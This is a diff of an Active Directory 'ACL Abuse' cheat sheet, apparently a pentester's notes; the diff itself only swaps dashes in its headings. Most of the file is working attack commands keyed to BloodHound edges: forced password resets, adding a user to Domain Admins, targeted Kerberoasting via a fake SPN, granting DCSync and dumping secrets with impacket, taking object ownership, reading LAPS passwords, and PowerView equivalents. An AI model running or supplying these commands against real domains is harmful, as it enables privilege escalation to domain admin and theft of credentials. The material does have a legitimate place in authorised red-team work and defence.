@@ -1,10 +1,10 @@
 # ACL Abuse
 
-Found via [[BloodHound]] — each edge tells you the attack.
+Found via [[BloodHound]] - each edge tells you the attack.
 
 ---
 
-## GenericAll on User — Change Their Password
+## GenericAll on User - Change Their Password
 
 ```bash
 net rpc password "targetuser" 'NewPassword123!' -U 'domain/controlleduser%password' -S $DC
@@ -16,7 +16,7 @@ impacket-changepasswd domain.local/targetuser@$DC -newpass 'NewPassword123!'
 
 ---
 
-## GenericAll on Group — Add Yourself
+## GenericAll on Group - Add Yourself
 
 ```bash
 net rpc group addmem "Domain Admins" controlleduser -U 'domain/controlleduser%password' -S $DC
@@ -24,7 +24,7 @@ net rpc group addmem "Domain Admins" controlleduser -U 'domain/controlleduser%pa
 
 ---
 
-## GenericWrite on User — Targeted Kerberoasting
+## GenericWrite on User - Targeted Kerberoasting
 
 ```bash
 # Add a fake SPN
@@ -49,7 +49,7 @@ net rpc password "targetuser" 'NewPassword123!' -U 'domain/controlleduser%passwo
 
 ---
 
-## WriteDACL — Grant Yourself DCSync
+## WriteDACL - Grant Yourself DCSync
 
 ```bash
 impacket-dacledit -action write -rights DCSync -principal controlleduser -target-dn "DC=domain,DC=local" domain.local/controlleduser:REDACTED
@@ -62,7 +62,7 @@ impacket-secretsdump domain.local/controlleduser:REDACTED
 
 ---
 
-## WriteOwner — Take Ownership Then WriteDACL
+## WriteOwner - Take Ownership Then WriteDACL
 
 ```bash
 impacket-owneredit -action write -new-owner controlleduser -target targetobject domain.local/controlleduser:REDACTED
@@ -83,12 +83,12 @@ nxc ldap $DC -u user -p pass -M laps
 ## PowerView Equivalents (Windows)
 
 ```powershell
-# GenericAll on user — reset password
+# GenericAll on user - reset password
 Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
 
 # Add to group
 Add-DomainGroupMember -Identity "Domain Admins" -Members controlleduser
 
-# WriteDACL — grant DCSync
+# WriteDACL - grant DCSync
 Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity controlleduser -Rights DCSync
 ```
